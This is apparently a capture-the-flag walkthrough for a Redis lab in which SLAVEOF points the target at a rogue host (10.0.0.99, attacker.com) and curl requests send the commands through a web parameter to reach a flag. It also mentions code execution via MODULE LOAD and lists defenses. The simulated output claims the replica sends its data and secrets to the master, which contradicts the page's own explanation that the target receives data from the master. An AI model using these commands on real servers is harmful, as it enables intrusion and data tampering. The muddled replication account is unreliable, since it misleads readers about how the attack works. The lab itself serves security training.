<h4>Step 1: SLAVEOF Exfiltration. Execute the Attack</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. SLAVEOF Exfiltration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">redis> </span>SLAVEOF 10.0.0.99 6379<br>
        <span class="prompt">Result: </span>OK -- Connecting to 10.0.0.99:6379 as replica...<br><br>
        <span class="prompt">[replication] </span>SYNC: Sending PSYNC to 10.0.0.99:6379...<br>
        <span class="prompt">[replication] </span>FULLRESYNC: Sending RDB snapshot to 10.0.0.99:6379...<br>
        &nbsp;&nbsp;- Transferring 8 keys (346 bytes)<br>
        &nbsp;&nbsp;- Keys sent: metrics:requests, <strong>internal:flag</strong>, cache:user:1001, cache:user:1002, cache:user:1003, internal:api_key, metrics:errors, metrics:latency_ms<br>
        <span class="prompt">[replication] </span>SYNC completed. All data replicated to 10.0.0.99:6379.<br>
        WARNING: All key-value data including secrets has been transmitted!
    </div>
</div>

<h4>Step 2: Retrieve the Flag Directly</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Read the Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">redis> </span>GET internal:flag<br>
        <span class="prompt">Result: </span><strong>FLAG{rd_sl4v30f_3xf1l}</strong>
    </div>
</div>

<h4>Step 3: SLAVEOF Attack (How It Works)</h4>
<p>
    <code>SLAVEOF</code> (or <code>REPLICAOF</code> in Redis 5+) makes the Redis instance
    replicate data from a remote master. An attacker can set up a rogue Redis server
    and make the target replicate FROM it, receiving arbitrary data.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. SLAVEOF Attack Chain</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Step 1: </span>SLAVEOF attacker.com 6379<br>
        <span class="prompt">// Target starts replicating from attacker's Redis</span><br><br>
        <span class="prompt">Step 2: </span>Attacker's Redis pushes malicious data<br>
        <span class="prompt">// Target now contains attacker-controlled keys</span><br><br>
        <span class="prompt">Step 3: </span>SLAVEOF NO ONE<br>
        <span class="prompt">// Stop replication -- malicious data persists</span><br><br>
        <span class="prompt">Exfil variant: </span>Combine with CONFIG SET + BGSAVE<br>
        <span class="prompt">// Write replicated data to filesystem</span>
    </div>
</div>

<h4>Step 4: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{rd_sl4v30f_3xf1l}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt"># Step 1: Trigger SLAVEOF exfiltration (start with fresh session cookie)</span><br>
        <span class="prompt">$ </span>curl -sc /tmp/lab4.txt "http://target/SQLi-Arena/redis/lab4" -o /dev/null<br>
        <span class="prompt">$ </span>curl -sb /tmp/lab4.txt "http://target/SQLi-Arena/redis/lab4" \<br> --data-urlencode "cmd=SLAVEOF 10.0.0.99 6379"<br><br>
        <span class="prompt"># Step 2: Read the flag key directly</span><br>
        <span class="prompt">$ </span>curl -sb /tmp/lab4.txt "http://target/SQLi-Arena/redis/lab4" \<br> --data-urlencode "cmd=GET internal:flag"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>SLAVEOF</code>/<code>REPLICAOF</code> allows an attacker
    to make a Redis instance replicate from a rogue master server. This enables:
    (1) <strong>data injection</strong>: push arbitrary keys into the target,
    (2) <strong>RCE via MODULE LOAD</strong>: push a malicious .so module via RDB transfer,
    (3) <strong>data exfiltration</strong>: the rogue master receives REPLCONF ACK with offset data.
    Tools like <a href="#">redis-rogue-server</a> automate this attack. Defense: disable
    <code>SLAVEOF</code> with <code>rename-command</code>, use ACLs (Redis 6+), and restrict
    network access.
</div>
